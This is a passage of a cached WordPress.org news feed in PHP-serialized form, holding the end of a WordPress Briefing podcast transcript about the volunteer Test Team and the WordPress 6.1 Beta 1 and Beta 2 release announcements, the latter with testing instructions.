you kind of get the momentum of getting the feedback in right when someone needs it.&nbsp;</p>\n\n\n\n<p>I think we could do that a bit more to make reporting problems easier because it&#8217;s kind of like you&#8217;re in the thick of it with a lot of people rather than maybe exploring an area where someone hasn&#8217;t looked at it in a minute.</p>\n\n\n\n<p>So that’s the thing that comes to mind is just the more we can take the time. I think this release cycle has been really good with that, where there&#8217;s been a call for testing for fluid typography. There&#8217;s also been one for using block template parts and classic themes. And there&#8217;s a ton of stuff that&#8217;s been happening where we can kind of make these both developer and more end user testing experiences easier and better.</p>\n\n\n\n<p>And Brian has done a great job continuing the tradition of, you know, helping test this latest release cycle. And he&#8217;s taken those posts and done an amazing job of helping, having specific testing as well. Tied to this, I think just this has always been a thing but better, easier testing environments for developers and for quickly setting up more WordPress sites to test things for end users.</p>\n\n\n\n<p><strong>[Brian Alexander 00:17:56]</strong></p>\n\n\n\n<p>Yeah. Another thing that we have been discussing in Slack in the Core and Core Test channels is the possibility of pre-populating the Trac tickets. With a template based on what it is that you&#8217;re reporting. So similar to copying a template for a test report out of the handbook. Instead, you would hit a button to say the type of bug you are submitting, and then it would pre-populate that, and then you could fill in the gaps for that. This already happens over in Gutenberg. There, there are templates, and I find that that is very helpful. And so being able to do that in Trac would be useful.&nbsp;</p>\n\n\n\n<p>And then for reporting problems on the user side, I thought that it would be interesting to have like you have for any other modern app, a button that says Report Bug in WordPress that could capture some intelligence data for your installation, the page that you&#8217;re on and have a simple text box where you could provide a little description and then submit that.</p>\n\n\n\n<p><strong>[Brian Alexander 00:19:08]&nbsp;</strong></p>\n\n\n\n<p>Now, these wouldn&#8217;t be the types of things that would just go straight into Trac, most likely. However, it would be an opportunity to allow end users to just send something in, and start having it looked at, rather than looking and saying, okay, I found a bug in WordPress. Now, what do I do?&nbsp; And then not reporting.&nbsp;</p>\n\n\n\n<p>So that would be the worst case is that the bug just doesn&#8217;t get reported. So that would be information that is already harvested if you go to your site health screen and your WordPress installation. A lot of that information that would be useful is there. In this type of bug report, we would want to anonymize and strip a lot of that information out.</p>\n\n\n\n<p>There&#8217;s a lot of private stuff you don&#8217;t wanna share, but there is that data there that&#8217;s available that could potentially help in doing a bug report.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:19:57]</strong></p>\n\n\n\n<p>Brilliant. All right. Question for everyone in the room: what opportunities are there currently to help with testing? Anne, I know, and you already mentioned a few, we can just bombard everybody with links to the tests if we want. But yeah, what opportunities are currently out there?</p>\n\n\n\n<p><strong>[Anne McCarthy 00:20:13]</strong></p>\n\n\n\n<p>Yeah, I&#8217;ll mention the Full Site Editing outreach program. I&#8217;m very biased, but we&#8217;re always looking for new folks. We just crossed, I think, 600 people, which was unbelievable. So even if you&#8217;re not necessarily always able to help join the calls for testing, you can always pop into the FSE outreach experiment channel, which we&#8217;ll also add a link to.</p>\n\n\n\n<p>And that&#8217;s just a great way when you have time to join because I flag stuff all the time, whether it&#8217;s about the outreach program or just in general across the project. Brian does really good weekly round-up testing posts as well. So make.wordpress.org/test is also a great place to get started.</p>\n\n\n\n<p>And then right now, I think when this comes out, will be a great time to be helping test WordPress 6.1. So check out that post. I kind of wanna just shove everyone in that direction currently cause I think that&#8217;s the most high-impact thing to get involved with and one of the great ways to give back to the next version of WordPress to make it really delightful and easy to use.</p>\n\n\n\n<p>Yeah, I&#8217;m just gonna leave it there, even though there are so many ways you can help.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:21:11]</strong></p>\n\n\n\n<p>WordPress 6.1 coming out on November 1st if you haven&#8217;t yet heard about it. Brian, what else have you got out there?</p>\n\n\n\n<p><strong>[Brian Alexander 00:21:16]</strong>&nbsp;</p>\n\n\n\n<p>In terms of the online stuff, Anne covered that pretty well. I would say if you have a local WordCamp, sign up for their contributor day or if there are any local WordPress meetups. When Covid ended up hitting and lockdowns were rolled out, a lot of this stuff started to really slow down. So I think now is a good time to maybe introduce the idea for, hey, let&#8217;s have a local meetup, and for a couple of hours, we&#8217;ll just do some testing, and look at some stuff in WordPress.&nbsp;</p>\n\n\n\n<p>So it might be a good way of getting people re-engaged. It&#8217;s a little bit lighter weight if you&#8217;re doing testing versus trying to actually provide a patch to fix an issue. So, might be a good way of bringing in some new faces and re-engaging people who we lost over the lockdown.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:22:09]</strong>&nbsp;</p>\n\n\n\n<p>Yeah, and if you all have never done a testing party for WordPress before, and it sounds like it&#8217;s maybe a really boring thing, it&#8217;s actually not, she said with strong authority and opinions. But also, I have never had a more successful learning experience with the WordPress CMS than when I was trying to figure it out with other people.</p>\n\n\n\n<p>They see things that you don&#8217;t see, they know things you don&#8217;t know, and it really covers a lot of the bases for unknown unknowns when you&#8217;re trying to learn something. And then also you have all these people that like, we’re really in it with you, and everyone&#8217;s really pulling for each other, and it&#8217;s actually a bit more fun than it sounds like when you&#8217;re just like, a testing party. It turns into just like jointly solving a puzzle together, which I think sounds like a lot of fun.</p>\n\n\n\n<p>It&#8217;s like a party, but for technology, I would feel this way. I am a mad extrovert, and we all know it, but. Now you two know it as well.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:23:08]&nbsp;</strong></p>\n\n\n\n<p>I have a final, just like a fun question for you both, and if you have an answer, great. And if you don&#8217;t have an answer, I would be surprised.</p>\n\n\n\n<p>So here we go. Last question of the day. If five more volunteers suddenly appeared to help on the Test Team, what would they do? Just, I waved a magic wand. I guess that&#8217;s what made it fun. I don&#8217;t know why. I was like, fun question and then I&#8217;m, like, assigned tasks that, Yeah, I waved a magic wand. That&#8217;s what made it fun.</p>\n\n\n\n<p><strong>[Brian Alexander 00:23:38]&nbsp;</strong></p>\n\n\n\n<p>Yeah, I would say I would probably point them to FSE outreach program posts because…</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:23:45]</strong>&nbsp;</p>\n\n\n\n<p>Woot woot.&nbsp;</p>\n\n\n\n<p><strong>[Brian Alexander 00:23:47]</strong></p>\n\n\n\n<p>…the outreach program does a great job of outlining steps. You&#8217;re isolating testing in one particular area. It&#8217;s got a lot of tests. There&#8217;s examples of the types of feedback that you&#8217;re looking for, et cetera.</p>\n\n\n\n<p>That&#8217;s a really good introduction to it, and most FSE testing does not require a local dev environment. Which is probably the biggest hurdle for a new tester coming in. If you do have developers with more experience, then they could start–and they wanted to look into Trac tickets or GitHub issues– then it does take a little bit of setup and you may spend the next few hours configuring your development environment.</p>\n\n\n\n<p>So instead, I would recommend that you start with something like FSE outreach program posts.</p>\n\n\n\n<p><strong>[Anne McCarthy 00:24:37]</strong></p>\n\n\n\n<p>I did not pay Brian to say that.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:24:42]&nbsp;</strong></p>\n\n\n\n<p>We&#8217;re just all partial to it here. That&#8217;s all.</p>\n\n\n\n<p><strong>[Anne McCarthy 00:24:45]&nbsp;</strong></p>\n\n\n\n<p>No, we really are. Yeah, no, this is, I love this question, and I actually find it really fun cause I think about it a lot. And we&#8217;ve talked about some of this stuff too, and it&#8217;s something that when I think about five more people suddenly appearing, makes me giddy.</p>\n\n\n\n<p>Because we have folks, who have helped with like, I think I&#8217;ve mentioned like translations and group testing and even responding to questions that come from the channel and like, I just wish if we had five folks full time dedicated to that, I could see way more hallway hangouts where we casually talk about stuff and actually go on a call and talk live.</p>\n\n\n\n<p>I could see folks, someone dedicated to helping translations and translating even more places. We have an Italian contributor who does it regularly, and a couple of Japanese contributors every once in awhile we get Spanish translation. But I&#8217;d love to see more translations to bring more people in, more facilitating group testing, more types of testing, helping me be more creative because sometimes I get a creative wall.</p>\n\n\n\n<p>But more than anything, if I really think long term about the project and thinking about this outreach program model, which I don&#8217;t think I fully appreciated how new it was, Josepha, when you introduced the idea, I think it would be so neat to bring in more folks to actually create new outreach programs.</p>\n\n\n\n<p><strong>[Anne McCarthy 00:25:52]&nbsp;</strong></p>\n\n\n\n<p>So maybe there&#8217;s an outreach program for theme authors or block theme authors, or maybe there&#8217;s an outreach program around collaborative editing. Like what does this look like, and how can we expand this to bring more people in? And I think a lot of that will prove the resiliency and lessons we&#8217;ve learned from Covid in the WordPress community.&nbsp;</p>\n\n\n\n<p>We can&#8217;t necessarily always rely on the meetup groups, so how can we meet people where they are? And I think there&#8217;s something really interesting and almost serendipitous that the outreach program started literally, I think it was like May 2020, like a couple of months into the pandemic.</p>\n\n\n\n<p>And I, like, I want to see it in a position of strength where we both have the in-person community alongside this outreach program model that can intertwine work. And I&#8217;d love to see the model expand to different types. And right now, maybe part of that is we use the outreach program model, the full site editing outreach program group itself, to experiment more and to keep that level of experimentation.</p>\n\n\n\n<p>That&#8217;s something I feel really strongly about is continuing to find what works and what doesn&#8217;t. And so if we had five more people, I could just, I&#8217;d probably go wild and have all sorts of cool, cool things and spinoffs, but I&#8217;m more introverted than Josepha, so there&#8217;s limitations to this.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:26:56]</strong>&nbsp;</p>\n\n\n\n<p>Well, you heard it here first. If you&#8217;re one of my 6,000 listeners. I only need five of one of you. Five of the ones of you to come and make Anne&#8217;s whole life an exciting joy for the next 12 months. So, I only need five of you and I know that you&#8217;re out there. There are 2000 or something, 6,000. I have no idea.</p>\n\n\n\n<p>I&#8217;ve got more than 1000 of you listening, and I know that you wanna come and help Anne cuz she&#8217;s a delight. I know you wanna come help Brian cuz he&#8217;s a delight. Both of you. This was such a fun conversation. Thank you for joining me today.</p>\n\n\n\n<p><strong>[Brian Alexander 00:27:29]</strong>&nbsp;</p>\n\n\n\n<p>Thank you, Josepha. Thank you, Anne.</p>\n\n\n\n<p><strong>[Anne McCarthy 00:27:31]</strong>&nbsp;</p>\n\n\n\n<p>Yeah. Thank you.</p>\n\n\n\n<p>[<strong>Josepha Haden Chomphosy </strong>00:27:33]</p>\n\n\n\n<p>And there it is a bit of a deep dive on the Test Team and how to get started on it. Like I mentioned, we&#8217;ll have a ton of links in the show notes over on wordpress.org/news. And I wanna remind folks that if you have questions or thoughts that you&#8217;d like to hear from me about, you can always email us at WPbriefing@wordpress.org.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:27:58]&nbsp;</strong></p>\n\n\n\n<p>That brings us now to our small list of big things. First and foremost, we are counting down the days to the WordPress 6.1 release. We are within a month of the target release date. So if you have not tested the latest version with your plugins or themes, now is the time.&nbsp;</p>\n\n\n\n<p>Secondly, we are seeing translated tutorials being submitted on learn.wordpress.org. I&#8217;m delighted to see that happening, and I encourage any polyglots out there who feel called to consider translating one into your language and help other people feel empowered to use WordPress.&nbsp;</p>\n\n\n\n<p>And then the third thing is that the WordPress Speaker Workshop for Women Voices in India just concluded, so to celebrate, we&#8217;ve opened registrations for the WordPress Speaker Workshop for Women Voices in Latin America. Unlike the last one, this event takes place in person on October 29th. And so I&#8217;ll include a link to registrations for that in the show notes as well.&nbsp;</p>\n\n\n\n<p>And that, my friends, is your small list of big things. Thanks for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosey, and I&#8217;ll see you again in a couple of weeks.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13551\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:8;a:6:{s:4:\"data\";s:69:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:34:\"WordPress 6.1 Beta 2 Now Available\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:70:\"https://wordpress.org/news/2022/09/wordpress-6-1-beta-2-now-available/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 27 Sep 2022 18:12:30 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:5:{i:0;a:5:{s:4:\"data\";s:11:\"Development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:3:\"6.1\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:11:\"development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:8:\"releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13533\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:306:\"WordPress 6.1 Beta 2 is now available for download and testing.\n\nThis version of the WordPress software is under development. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test Beta 2 on a test server and site.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:16:\"Jonathan Pantani\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:5875:\"\n<p><em><strong>WordPress 6.1 Beta 2 is now available for download and testing.</strong></em></p>\n\n\n\n<p><strong>This version of the WordPress software is under development</strong>. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test Beta 2 on a test server and site.&nbsp;</p>\n\n\n\n<p>You can test WordPress 6.1 Beta 2 in three ways:</p>\n\n\n\n<p><strong>Option 1: </strong>Install and activate the <a href=\"https://wordpress.org/plugins/wordpress-beta-tester/\">WordPress Beta Tester</a> plugin (select the “Bleeding edge” channel and “Beta/RC Only” stream).</p>\n\n\n\n<p><strong>Option 2: </strong>Direct download the <a href=\"https://wordpress.org/wordpress-6.1-beta2.zip\">Beta 2 version (zip)</a>.</p>\n\n\n\n<p><strong>Option 3:</strong> Use the following WP-CLI command:</p>\n\n\n\n<p><code>wp core update --version=6.1-beta2</code></p>\n\n\n\n<p>The current target for the final release is November 1, 2022, which is about five weeks away.&nbsp;</p>\n\n\n\n<p>Additional information on the <a href=\"https://make.wordpress.org/core/6-1/\">6.1 release cycle is available</a>.</p>\n\n\n\n<p>Check the <a href=\"https://make.wordpress.org/core/\">Make WordPress Core blog</a> for <a href=\"https://make.wordpress.org/core/tag/dev-notes+6-1/\">6.1-related developer notes</a> in the coming weeks detailing all upcoming changes.</p>\n\n\n\n<h2><strong>Keep WordPress bug-free – help with testing</strong></h2>\n\n\n\n<p>Testing for issues is critical for stabilizing a release throughout its development. Testing is also a great way to contribute. This detailed guide is an excellent start if you have never tested a beta release before.</p>\n\n\n\n<p>Testing helps ensure that this and future releases of WordPress are as stable and issue-free as possible. Anyone can take part in testing – especially great WordPress community members like you.</p>\n\n\n\n<p>Want to know more about testing releases like this one? Read about the <a href=\"https://make.wordpress.org/test/\">testing initiatives</a> that happen in Make Core. You can also join a <a href=\"https://wordpress.slack.com/messages/core-test/\">core-test channel</a> on the <a href=\"https://wordpress.slack.com/\">Making WordPress Slack workspace</a>.</p>\n\n\n\n<p>If you have run into an issue, please report it to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">Alpha/Beta area</a> in the support forums. If you are comfortable&nbsp;writing a reproducible bug report, you can <a href=\"https://core.trac.wordpress.org/newticket\">file one on WordPress Trac</a>. This is also where you can find a list of <a href=\"https://core.trac.wordpress.org/tickets/major\">known bugs</a>.</p>\n\n\n\n<p>To review features in the Gutenberg releases since WordPress 6.0 (the most recent major release of WordPress), access the <em>What’s New In Gutenberg</em> posts for <a href=\"https://make.wordpress.org/core/2022/09/16/whats-new-in-gutenberg-14-1-15-september/\">14.1</a>, <a href=\"https://make.wordpress.org/core/2022/09/01/whats-new-in-gutenberg-14-0-31-august/\">14.0</a>, <a href=\"https://make.wordpress.org/core/2022/08/17/whats-new-in-gutenberg-13-9-17-august/\">13.9</a>, <a href=\"https://make.wordpress.org/core/2022/08/04/whats-new-in-gutenberg-13-8-3-august/\">13.8</a>, <a href=\"https://make.wordpress.org/core/2022/07/20/whats-new-in-gutenberg-13-7-20-july/\">13.7</a>, <a href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/\">13.6</a>, <a href=\"https://make.wordpress.org/core/2022/06/22/whats-new-in-gutenberg-13-5-22-june/\">13.5</a>, <a href=\"https://make.wordpress.org/core/2022/06/10/whats-new-in-gutenberg-13-4-8-june/\">13.4</a>, <a href=\"https://make.wordpress.org/core/2022/05/26/whats-new-in-gutenberg-13-3-0-may-25/\">13.3</a>, <a href=\"https://make.wordpress.org/core/2022/05/12/whats-new-in-gutenberg-13-2-may-11/\">13.2</a>, and <a href=\"https://make.wordpress.org/core/2022/04/28/whats-new-in-gutenberg-13-1-27-april/\">13.1</a>.</p>\n\n\n\n<p>This release contains more than 350 enhancements and 350 bug fixes for the editor, including more than <a href=\"https://core.trac.wordpress.org/query?status=closed&amp;milestone=6.1&amp;group=component&amp;max=500&amp;col=id&amp;col=summary&amp;col=owner&amp;col=type&amp;col=priority&amp;col=component&amp;col=version&amp;order=priority\">300 tickets for WordPress 6.1 core</a>. More fixes are on the way in the remainder of the 6.1 release cycle.</p>\n\n\n\n<h2><strong>Some highlights</strong></h2>\n\n\n\n<p>Want to know what’s new in version 6.1? <a href=\"https://wordpress.org/news/2022/09/wordpress-6-1-beta-1-now-available/\">Read the initial Beta 1 announcement</a> for some details, or check out the <a href=\"https://make.wordpress.org/core/2022/09/14/6-1-product-walk-through-recap/\">product walk-through recording</a>.</p>\n\n\n\n<h2><strong>What’s new in Beta 2</strong></h2>\n\n\n\n<p>Here are some updates since last week&#8217;s Beta 1 release:</p>\n\n\n\n<ul>\n<li><a href=\"https://github.com/WordPress/gutenberg/commits/wp/6.1\">24 issues addressed in GitHub</a></li>\n</ul>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<h2>A haiku for Beta 2</h2>\n\n\n\n<p>WordPress six-point-one,<br>Please help test Beta 2 now.<br>Best release ever.<br></p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p>Thank you to the following contributors for collaborating on this post: <a href=\"https://profiles.wordpress.org/dansoschin/\">@dansoschin</a>, <a href=\"https://profiles.wordpress.org/robinwpdeveloper/\">@robinwpdeveloper</a>, <a href=\"https://profiles.wordpress.org/webcommsat/\">@webcommsat</a>, <a href=\'https://profiles.wordpress.org/jeffpaul/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>jeffpaul</a>, and <a href=\'https://profiles.wordpress.org/cbringmann/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>cbringmann</a>.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13533\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:9;a:6:{s:4:\"data\";s:69:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:34:\"WordPress 6.1 Beta 1 Now Available\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:70:\"https://wordpress.org/news/2022/09/wordpress-6-1-beta-1-now-available/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Wed, 21 Sep 2022 17:09:56 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:5:{i:0;a:5:{s:4:\"data\";s:11:\"Development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:3:\"6.1\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:11:\"development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:8:\"releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13495\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:306:\"WordPress 6.1 Beta 1 is now available for download and testing.\n\nThis version of the WordPress software is under development. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test Beta 1 on a test server and site.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:16:\"Jonathan Pantani\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:8473:\"\n<p>WordPress 6.1 Beta 1 is now available for download and testing.</p>\n\n\n\n<p><strong>This version of the WordPress software is under development</strong>. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test Beta 1 on a test server and site.&nbsp;</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p>You can test WordPress 6.1 Beta 1 in three ways:</p>\n\n\n\n<p><strong>Option 1: </strong>Install and activate the <a href=\"https://wordpress.org/plugins/wordpress-beta-tester/\">WordPress Beta Tester</a> plugin (select the “Bleeding edge” channel and “Beta/RC Only” stream).</p>\n\n\n\n<p><strong>Option 2: </strong>Direct download the <a href=\"https://wordpress.org/wordpress-6.1-beta1.zip\">Beta 1 version (zip)</a>.</p>\n\n\n\n<p><strong>Option 3:</strong> Use the following WP-CLI command:</p>\n\n\n\n<p><code>wp core update --version=6.1-beta1</code></p>\n\n\n\n<p>The current target for the final release is November 1, 2022, which is about six weeks away.&nbsp;</p>\n\n\n\n<p>Additional information on the <a href=\"https://make.wordpress.org/core/6-1/\">6.1 release cycle is available</a>.</p>\n\n\n\n<p>Check the <a href=\"https://make.wordpress.org/core/\">Make WordPress Core blog</a> for <a href=\"https://make.wordpress.org/core/tag/dev-notes+6-1/\">6.1-related developer notes</a> in the coming weeks detailing all upcoming changes.</p>\n\n\n\n<h2><strong>Keep WordPress bug-free – help with testing</strong></h2>\n\n\n\n<p>Testing for issues is critical for stabilizing a release throughout its development. Testing is also a great way to contribute. If you have never tested a beta release before, <a href=\"https://make.wordpress.org/test/2022/09/21/help-test-wordpress-6-1/\">this detailed guide</a> is a great start.</p>\n\n\n\n<p>Testing helps make sure that this and future releases of WordPress are as stable and issue-free as possible. Anyone can do it – especially great WordPress community members like you.</p>\n\n\n\n<p>Want to know more about testing releases like this one? Read about the <a href=\"https://make.wordpress.org/test/\">testing initiatives</a> that happen in Make Core. You can also join a <a href=\"https://wordpress.slack.com/messages/core-test/\">publicly-accessible channel</a> on the <a href=\"https://wordpress.slack.com/\">Making WordPress Slack workspace</a>.</p>\n\n\n\n<p>If you think you have run into an issue, please report it to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">Alpha/Beta area</a> in the support forums. If you are comfortable writing a reproducible bug report, you can <a href=\"https://core.trac.wordpress.org/newticket\">file one on WordPress Trac</a>. This is also where you can find a list of <a href=\"https://core.trac.wordpress.org/tickets/major\">known bugs</a>.</p>\n\n\n\n<p>To review features in the Gutenberg releases since WordPress 6.0 (the most recent major release of WordPress), access the <em>What’s New In Gutenberg</em> posts for <a href=\"https://make.wordpress.org/core/2022/09/16/whats-new-in-gutenberg-14-1-15-september/\">14.1</a>, <a href=\"https://make.wordpress.org/core/2022/09/01/whats-new-in-gutenberg-14-0-31-august/\">14.0</a>, <a href=\"https://make.wordpress.org/core/2022/08/17/whats-new-in-gutenberg-13-9-17-august/\">13.9</a>, <a href=\"https://make.wordpress.org/core/2022/08/04/whats-new-in-gutenberg-13-8-3-august/\">13.8</a>, <a href=\"https://make.wordpress.org/core/2022/07/20/whats-new-in-gutenberg-13-7-20-july/\">13.7</a>, <a href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/\">13.6</a>, <a href=\"https://make.wordpress.org/core/2022/06/22/whats-new-in-gutenberg-13-5-22-june/\">13.5</a>, <a href=\"https://make.wordpress.org/core/2022/06/10/whats-new-in-gutenberg-13-4-8-june/\">13.4</a>, <a href=\"https://make.wordpress.org/core/2022/05/26/whats-new-in-gutenberg-13-3-0-may-25/\">13.3</a>, <a href=\"https://make.wordpress.org/core/2022/05/12/whats-new-in-gutenberg-13-2-may-11/\">13.2</a>, and <a href=\"https://make.wordpress.org/core/2022/04/28/whats-new-in-gutenberg-13-1-27-april/\">13.1</a>.</p>\n\n\n\n<p>This release contains more than 350 enhancements and 350 bug fixes for the editor, including more than <a href=\"https://core.trac.wordpress.org/query?status=closed&amp;milestone=6.1&amp;group=component&amp;max=500&amp;col=id&amp;col=summary&amp;col=owner&amp;col=type&amp;col=priority&amp;col=component&amp;col=version&amp;order=priority\">250 tickets for the WordPress 6.1 core</a>.</p>\n\n\n\n<h2><strong>Some highlights</strong></h2>\n\n\n\n<p><em>Want to know what’s new in WordPress version 6.1? Read on for some highlights.</em></p>\n\n\n\n<h3>Features for end-users</h3>\n\n\n\n<ul>\n<li>Default theme powered by 10 unique style variations (<a rel=\"noreferrer noopener\" href=\"https://make.wordpress.org/design/2022/09/07/tt3-default-theme-announcing-style-variation-selections/\" target=\"_blank\">learn more</a>)</li>\n\n\n\n<li>More design tools in more blocks (<a rel=\"noreferrer noopener\" href=\"https://github.com/WordPress/gutenberg/issues/43241\" target=\"_blank\">learn more</a>)</li>\n\n\n\n<li>Expanded and refined&nbsp;<a rel=\"noreferrer noopener\" href=\"https://make.wordpress.org/core/2022/08/25/core-editor-improvement-refining-the-template-creation-experience/\" target=\"_blank\">template experience</a>&nbsp;and&nbsp;<a rel=\"noreferrer noopener\" 